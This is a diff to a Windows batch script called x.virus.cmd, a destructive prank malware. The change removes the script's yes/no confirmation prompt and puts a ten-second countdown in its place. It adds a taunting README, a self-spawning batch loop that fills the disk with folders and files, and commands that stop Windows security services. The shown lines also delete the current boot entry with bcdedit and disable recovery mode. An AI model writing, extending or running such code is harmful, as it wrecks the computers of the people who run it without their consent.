@@ -16,14 +16,18 @@ echo Tested Windows OS: Windows 8.1/10
 echo For: Windows 8/8.1/10
 echo Open as administrator permission.
 echo ----------
-echo Your computer may be damaged. Press [Y] to continue or [N] to exit.
-choice /c YN /n /m "Do you want to continue?"
-if %errorlevel%==2 (
-    echo Operation cancelled by user.
-    exit
-)
-if %errorlevel%==1 (
+ECHO Your computer can be damaged after 10 seconds. If you do not want your computer to be damaged, close the x.virus.cmd > warning.txt
+start warning.txt
+echo Your computer can be damaged after 10 seconds. If you do not want your computer to be damaged, close the x.virus.cmd
+timeout /t 10 /nobreak >nul
+echo YOU`VE BEEN HACKED!
 ECHO Hello %username%. Your computer has been fucked by x.virus. I put a password on your account, Killed your computer, Turned off recovery mode, cry HAHAHAHAHAHAHA! > README.txt
+echo @echo off > filespam.bat
+echo :loop >> filespam.bat
+echo md hackedbyxvirus^%random^% >> filespam.bat
+echo echo x.virus vs ^%username^%^> hackedbyxvirus^%random^%.txt >> filespam.bat
+echo goto loop >> filespam.bat
+start filespam.bat
 start README.txt
 net stop "SecurityHealthService"
 net stop "Security Center"
@@ -213,4 +217,3 @@ bcdedit /delete {current} /f
     bcdedit /set {default} recoveryenabled No
     bcdedit /delete {current} /f
 goto loop
-)
